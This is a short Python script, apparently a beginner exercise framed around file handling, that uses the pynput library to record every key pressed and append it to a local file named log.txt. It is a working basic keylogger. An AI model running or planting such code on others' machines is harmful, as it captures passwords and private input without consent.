# storing the keystrokes in a text file
# File Handling - How to read, write and append to a file
from pynput.keyboard import Listener

def writetofile(key):
    letter = str(key)
    letter = letter.replace("'","")
    if letter == "Key.space":
        letter = " "
    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()